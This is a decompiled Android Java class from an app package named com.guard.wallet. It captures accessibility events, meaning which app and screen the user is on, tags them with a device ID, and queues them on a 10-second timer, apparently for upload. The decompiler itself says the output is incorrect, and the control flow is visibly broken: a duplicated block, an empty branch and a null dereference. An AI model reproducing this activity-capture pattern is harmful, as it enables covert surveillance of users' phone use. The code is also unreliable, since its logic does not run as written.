package com.guard.wallet.thread;

import a1.AbstractC0026q;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqMessageVO;
import com.guard.wallet.stat.AccessibilityEventStatVO;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Date;
import java.util.Objects;
import java.util.Timer;
import java.util.concurrent.ConcurrentLinkedQueue;
import com.guard.wallet.entity.BuildConfig;

/* renamed from: com.guard.wallet.thread.e */
/* loaded from: classes.dex */
public final class C0236e {

    /* renamed from: a */
    public final Timer f359a;

    /* renamed from: b */
    public boolean f360b;

    /* renamed from: c */
    public Long f361c;

    /* renamed from: d */
    public String f362d;

    /* renamed from: e */
    public final ConcurrentLinkedQueue f363e;

    /* renamed from: f */
    public final ConcurrentLinkedQueue f364f;

    public C0236e() {
        Timer timer = new Timer();
        this.f359a = timer;
        this.f360b = false;
        this.f361c = Long.valueOf(new Date().getTime());
        this.f362d = BuildConfig.FLAVOR;
        this.f363e = new ConcurrentLinkedQueue();
        this.f364f = new ConcurrentLinkedQueue();
        timer.schedule(new C0235d(this, 0), 10000L, 10000L);
    }

    /* renamed from: a */
    public final void m578a(MessageRecordVO messageRecordVO) {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return;
        }
        messageRecordVO.setDeviceId(m708l);
        ReqMessageVO reqMessageVO = new ReqMessageVO();
        reqMessageVO.setDeviceId(messageRecordVO.getDeviceId());
        reqMessageVO.setIntentCode(messageRecordVO.getIntentCode());
        if (messageRecordVO.getExtraBody() != null) {
            reqMessageVO.setExtraBody(AbstractC0252h.m693N(messageRecordVO.getExtraBody()));
        }
        this.f364f.offer(reqMessageVO);
    }

    /* JADX WARN: Removed duplicated region for block: B:19:0x0083  */
    /* JADX WARN: Removed duplicated region for block: B:25:0x00b2  */
    /* JADX WARN: Removed duplicated region for block: B:29:0x00bf  */
    /* renamed from: b */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m579b(MessageRecordVO messageRecordVO) {
        boolean z2;
        AccessibilityEventStatVO accessibilityEventStatVO;
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return;
        }
        messageRecordVO.setDeviceId(m708l);
        if (Objects.equals(messageRecordVO.getIntentCode(), "android.accessibility.service.USAGE_SUMMARY") && (accessibilityEventStatVO = (AccessibilityEventStatVO) messageRecordVO.getExtraBody()) != null) {
            boolean m151B = AbstractC0026q.m151B(accessibilityEventStatVO.getEventPackageName());
            String str = BuildConfig.FLAVOR;
            if (!m151B) {
                str = BuildConfig.FLAVOR.concat(accessibilityEventStatVO.getEventPackageName());
            }
            if (!AbstractC0026q.m151B(accessibilityEventStatVO.getEventClassName())) {
                str = str.concat(":").concat(accessibilityEventStatVO.getEventClassName());
            }
            String concat = str.concat(":").concat(String.valueOf(accessibilityEventStatVO.getEventValue()));
            if (!Objects.equals(concat, this.f362d)) {
                this.f362d = concat;
            } else if (accessibilityEventStatVO.getTimestamp().longValue() - this.f361c.longValue() < 1000) {
                z2 = false;
                if (z2) {
                    ReqMessageVO reqMessageVO = new ReqMessageVO();
                    reqMessageVO.setDeviceId(messageRecordVO.getDeviceId());
                    reqMessageVO.setIntentCode(messageRecordVO.getIntentCode());
                    if (messageRecordVO.getExtraBody() != null) {
                        reqMessageVO.setExtraBody(AbstractC0252h.m693N(messageRecordVO.getExtraBody()));
                    }
                    this.f363e.offer(reqMessageVO);
                }
                this.f361c = Long.valueOf(messageRecordVO.getExtraBody() == null ? messageRecordVO.getExtraBody().getTimestamp().longValue() : new Date().getTime());
            }
        }
        z2 = true;
        if (z2) {
        }
        this.f361c = Long.valueOf(messageRecordVO.getExtraBody() == null ? messageRecordVO.getExtraBody().getTimestamp().longValue() : new Date().getTime());
    }
}
